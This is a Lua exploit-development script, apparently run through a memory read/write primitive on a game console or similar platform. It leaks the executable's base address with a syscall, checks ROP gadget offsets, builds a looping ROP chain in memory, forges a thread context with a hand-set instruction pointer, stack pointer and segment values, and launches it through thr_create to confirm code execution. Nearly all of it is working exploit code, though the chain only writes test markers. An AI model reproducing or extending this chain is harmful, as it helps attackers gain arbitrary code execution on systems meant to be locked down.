-- CRASH_CLASS: MODERATE
-- PROBE 127h: Fixed child thread ROP write loop
--
-- 127g's thr_create returned -1 because the TID output pointer was NULL.
-- The handler writes TID before validating the ucontext gates, so NULL→fault→-1.
-- Fix: pass tid_buf as second arg.
--
-- Also: verify chain values are correct before launch, add diagnostic reads.

print("=== PROBE 127h: THREAD ROP FIXED ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local function alive()
    return N(native.fcall_with_rax(stub, 20)) == pid
end

-- [A] Eboot base
print("[A] Eboot base")
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local text_lo = rd(N(info) + 0x108) or 0
local text_hi = rd(N(info) + 0x10C) or 0
if text_lo < 0 then text_lo = text_lo + 0x100000000 end
if text_hi < 0 then text_hi = text_hi + 0x100000000 end
print(string.format("  eboot=0x%X%08X", text_hi, text_lo))

local function eaddr(offset)
    return uint64(string.format("0x%X%08X", text_hi, text_lo + offset))
end
local function enum(offset)
    return N(eaddr(offset))
end

-- Gadget offsets (confirmed 127d/127e)
local G = {
    ret       = 0x42,
    pop_rax   = 0x992,
    pop_rsp   = 0x9A2,
    pop_rdi   = 0xC9DFE,
    pop_rsi   = 0xD77D,
    pop_rdx   = 0x3B02D7,
    mov_w     = 0x92C67,
    jmp_self  = 0x15481,
}

-- Verify critical gadgets
local function vg(name, off, expect_bytes)
    local d = rd(enum(off)) or 0
    if d < 0 then d = d + 0x100000000 end
    local b0 = d % 256
    local b1 = math.floor(d / 256) % 256
    local b2 = math.floor(d / 65536) % 256
    local ok = true
    for i, eb in ipairs(expect_bytes) do
        local actual = ({b0, b1, b2})[i]
        if actual ~= eb then ok = false end
    end
    print(string.format("  %-12s +0x%X: %02X %02X %02X %s",
        name, off, b0, b1, b2, ok and "OK" or "BAD"))
    return ok
end

local all_ok = true
all_ok = vg("ret", G.ret, {0xC3}) and all_ok
all_ok = vg("pop_rdi", G.pop_rdi, {0x5F, 0xC3}) and all_ok
all_ok = vg("pop_rax", G.pop_rax, {0x58, 0xC3}) and all_ok
all_ok = vg("pop_rsp", G.pop_rsp, {0x5C, 0xC3}) and all_ok
all_ok = vg("mov_w", G.mov_w, {0x48, 0x89, 0x07}) and all_ok

if not all_ok then print("GADGET MISMATCH!") return end
if not alive() then print("DIED!") return end

-- [B] Allocations
print("")
print("[B] Allocations")
local shared = memory.alloc(0x1000)
local stack  = memory.alloc(0x4000)
local big_ctx = memory.alloc(0x500)
local tid_buf = memory.alloc(8)

local S   = N(shared)
local STK = N(stack)
local BC  = N(big_ctx)
local TB  = N(tid_buf)

print(string.format("  shared=%s", fmt(shared)))
print(string.format("  stack =%s", fmt(stack)))
print(string.format("  ctx   =%s", fmt(big_ctx)))
print(string.format("  tid   =%s", fmt(tid_buf)))

-- Zero shared
wq(S, uint64("0x0"))
wq(S + 8, uint64("0x0"))

-- Zero tid
wq(TB, uint64("0x0"))

-- [C] Build ROP chain
print("")
print("[C] ROP chain")
local CB = STK + 0x3000

-- Chain: write marker to shared[0], write marker to shared[8], loop
-- [0x00] pop_rdi; ret
-- [0x08] &shared[0]
-- [0x10] pop_rax; ret
-- [0x18] 0xDEADBEEFCAFE0001
-- [0x20] mov [rdi],rax; ret
-- [0x28] pop_rdi; ret
-- [0x30] &shared[8]
-- [0x38] pop_rax; ret
-- [0x40] 0x1111111111111111
-- [0x48] mov [rdi],rax; ret
-- [0x50] pop_rsp; ret  → loop to [0x00]
-- [0x58] chain_base

wq(CB + 0x00, eaddr(G.pop_rdi))
wq(CB + 0x08, shared)
wq(CB + 0x10, eaddr(G.pop_rax))
wq(CB + 0x18, uint64("0xDEADBEEFCAFE0001"))
wq(CB + 0x20, eaddr(G.mov_w))
wq(CB + 0x28, eaddr(G.pop_rdi))
wq(CB + 0x30, uint64(string.format("0x%X", S + 8)))
wq(CB + 0x38, eaddr(G.pop_rax))
wq(CB + 0x40, uint64("0x1111111111111111"))
wq(CB + 0x48, eaddr(G.mov_w))
wq(CB + 0x50, eaddr(G.pop_rsp))
wq(CB + 0x58, uint64(string.format("0x%X", CB)))

-- Verify chain
local v0 = rq(CB)
local v1 = rq(CB + 0x08)
local v2 = rq(CB + 0x18)
local v4 = rq(CB + 0x20)
print(string.format("  [0x00] pop_rdi : %s", fmt(v0)))
print(string.format("  [0x08] shared  : %s (expect %s)", fmt(v1), fmt(shared)))
print(string.format("  [0x18] marker  : %s", fmt(v2)))
print(string.format("  [0x20] mov_w   : %s", fmt(v4)))

if not alive() then print("DIED building chain!") return end

-- [D] Build ucontext
print("")
print("[D] Ucontext")

-- Zero full 0x4C0 bytes
for off = 0, 0x4BC, 4 do wd(BC + off, 0) end

-- RIP = ret gadget (starts chain from RSP)
local rip_lo = (text_lo + G.ret) % 0x100000000
local rip_hi = text_hi + math.floor((text_lo + G.ret) / 0x100000000)
wd(BC + 0xE0, rip_lo)
wd(BC + 0xE4, rip_hi)

-- RSP = chain base
local rsp_lo = CB % 0x100000000
local rsp_hi = math.floor(CB / 0x100000000)
wd(BC + 0xF8, rsp_lo)
wd(BC + 0xFC, rsp_hi)

-- CS, SS
wd(BC + 0xC0, 0x43)
wd(BC + 0x100, 0x3B)

-- Gates
wd(BC + 0x108, 0x480)
wd(BC + 0xD0, 0x07)
wd(BC + 0x110, 0x10000)

-- RBP (sane stack frame pointer)
local rbp = STK + 0x3F00
local rbp_lo = rbp % 0x100000000
local rbp_hi = math.floor(rbp / 0x100000000)
wd(BC + 0x88, rbp_lo)
wd(BC + 0x8C, rbp_hi)

print(string.format("  RIP=0x%X%08X (ret gadget)", rip_hi, rip_lo))
print(string.format("  RSP=0x%X%08X (chain base)", rsp_hi, rsp_lo))
print(string.format("  CS=0x43 SS=0x3B"))
print(string.format("  gates: +0x108=0x480 +0xD0=7 +0x110=0x10000"))

-- Verify key ucontext fields by readback
local ck_rip = rq(BC + 0xE0)
local ck_rsp = rq(BC + 0xF8)
local ck_cs  = rd(BC + 0xC0) or 0
local ck_ss  = rd(BC + 0x100) or 0
local ck_g1  = rd(BC + 0x108) or 0
local ck_g2  = rd(BC + 0xD0) or 0
local ck_g3  = rd(BC + 0x110) or 0
print(string.format("  readback: RIP=%s RSP=%s", fmt(ck_rip), fmt(ck_rsp)))
print(string.format("  readback: CS=0x%X SS=0x%X g1=0x%X g2=0x%X g3=0x%X",
    ck_cs, ck_ss, ck_g1, ck_g2, ck_g3))

if not alive() then print("DIED building ucontext!") return end

-- [E] Create child thread — with tid_buf as second arg!
print("")
print("[E] Creating child thread")
print("  shared before: " .. fmt(rq(S)))

local sc_thr = mk(430)
local thr_ret = nil
local thr_ok = pcall(function()
    thr_ret = sc_thr(big_ctx, tid_buf, uint64(0), uint64(0), uint64(0), uint64(0))
end)

local tid_val = rq(TB)
print(string.format("  thr_create: ok=%s ret=%s", tostring(thr_ok), fmt(thr_ret)))
print(string.format("  tid=%s", fmt(tid_val)))

if not alive() then print("DIED after thr_create!") return end

-- [F] Read shared page
print("")
print("[F] Shared page reads")
for attempt = 1, 10 do
    local v = rq(S)
    local v2 = rq(S + 8)
    print(string.format("  #%02d: [0]=%s [8]=%s", attempt, fmt(v), fmt(v2)))
    if v and N(v) ~= 0 then
        print("  *** CHILD THREAD IS WRITING! ***")
        break
    end
    -- Spin-wait: 200 getpid calls
    for i = 1, 200 do native.fcall_with_rax(stub, 20) end
end

-- Final
local final0 = rq(S)
local final8 = rq(S + 8)
print("")
print(string.format("  final: [0]=%s [8]=%s", fmt(final0), fmt(final8)))

if final0 and fmt(final0) == fmt(uint64("0xDEADBEEFCAFE0001")) then
    print("  *** ROP WRITE LOOP CONFIRMED ***")
elseif final0 and N(final0) ~= 0 then
    print("  child wrote SOMETHING (not expected marker)")
else
    print("  child did not write")
end

-- Check if child is still alive via thr_kill
if tid_val and N(tid_val) ~= 0 then
    local sc_kill = mk(433)  -- thr_kill
    local kill_ret = nil
    local kill_ok = pcall(function()
        kill_ret = sc_kill(tid_val, uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    print(string.format("  thr_kill(tid, 0): ok=%s ret=%s",
        tostring(kill_ok), fmt(kill_ret)))
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 127h COMPLETE ===")
